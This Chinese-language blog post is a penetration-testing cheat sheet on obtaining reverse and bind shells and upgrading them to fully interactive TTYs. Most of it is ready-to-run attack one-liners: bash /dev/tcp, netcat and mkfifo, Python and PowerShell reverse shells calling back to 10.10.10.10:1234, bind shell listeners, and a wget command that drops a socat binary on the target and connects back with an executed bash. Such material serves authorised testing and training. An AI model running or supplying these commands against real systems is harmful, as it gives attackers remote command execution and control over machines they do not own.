---
title: "掌控全局：反弹 Shell 升级为全交互式 TTY"
date: 2024-05-25
tags:
  - Linux
categories:
  - Web 安全
---

为了更好的攻击体验和效率。

<!--more-->

## 常见的获取 shell 方式

更多方式请参考 https://www.revshells.com 。

### Reverse shell

直接使用 bash：

```bash
bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
```

在程序使用 `sh -c` 运行命令时可能不支持上面的部分 bash 语法，因此可以套一层 bash：

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

直接使用 nc：

```bash
nc 10.10.10.10 1234 -e bash
```

nc 不支持 `-e` 时借助管道：

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

使用 Python：

```bash
export RHOST="10.10.10.10";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

Windows 上使用 Powershell：

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### Bind shell

使用 nc：

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp 1234 >/tmp/f
```

使用 Python 3：

```bash
python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

Windows 上使用 Powershell：

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

## Simple shell 的问题

通过上述方式获得的 Simple Shell 通常存在诸多问题，最大的问题就是按下 Ctrl+C 时不会像我们预期的那样停止 Shell 内运行的程序，而是停止了 Shell 本身。除此之外，其他问题包括：

- 无法运行需要终端的程序，例如 `su` 和 `ssh` 等
- 无法使用交互式程序，例如 `vim` 等
- 无法使用 Tab 补全
- 无法按上箭头回溯命令历史
- 无法使用左右箭头移动光标
- 无法使用终端快捷键，例如 Ctrl+L 清屏等
- 通常不显示 STDERR

## 升级为半交互式伪终端

### 使用 Python

在主机上有 Python 的情况下（使用 `which python python2 python3` 检测，有一个就行），我们可以快速创建一个伪终端，使得需要终端的程序能够运行，如果只是需要用 `su` 等命令来提权的话这样会很方便：

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

注意视情况替换 `python` 为 `python2` 或 `python3` 等。但这样依然无法正常处理 Ctrl+C，也无法解决上述其他问题。

### 使用 script

很多容器内是没有 Python 的，这时我们可以借助 Linux 自带的 `script` 程序来达到同样的效果：

```bash
$ script -qc /bin/bash /dev/null
```

## 升级为全交互式 TTY

### 使用 stty

这个方法仅适用于 bash，使用其他 shell 时可以先切换到 bash 再设置 nc 监听。我们还是先使用上述两种方法之一创建伪终端，然后通过 Ctrl+Z 把 shell 挂起。在主机上继续运行：

```bash
$ stty raw -echo;fg
```

此时升级为 TTY 的 shell 已经来到前台，在 shell 内运行 `reset` 即可获得全交互式的 shell。我们还可以对这个全交互式 shell 的样式进行一些调整，让它使用和我们终端相同的配色和大小：

```bash
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <rows> columns <cols>
```

上面的 `rows` 和 `cols` 具体值可以通过在主机上运行 `stty size` 获取到。

### 使用 socat

我们也可以使用 socat 直接生成一个全交互式 TTY，在 [这里](https://github.com/andrew-d/static-binaries) 可以下载到二进制文件。

首先在我们的主机上运行：

```bash
$ socat file:`tty`,raw,echo=0 tcp-listen:1234
```

随后在靶机上运行：

```bash
$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:1234
```

这个方法看似操作起来最简单，但需要在靶机上植入额外文件，还需要靶机能成功访问 GitHub 下载二进制文件，比较麻烦。然而，在 Windows 上升级终端的方式非常有限，常常不得不使用这种方式，此时使用的 [二进制文件](https://github.com/3ndG4me/socat) 以及命令都会有一些区别。

首先在我们的主机上运行：

```bash
$ socat TCP4-LISTEN:1234,fork STDOUT
```

随后在靶机上运行：

```cmd
socat.exe TCP4:10.10.10.10:1234 EXEC:'cmd.exe',pipes
```

## 参考资料

1. [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
2. [Upgrade a linux reverse shell to a fully usable TTY shell](https://zweilosec.github.io/posts/upgrade-linux-shell)
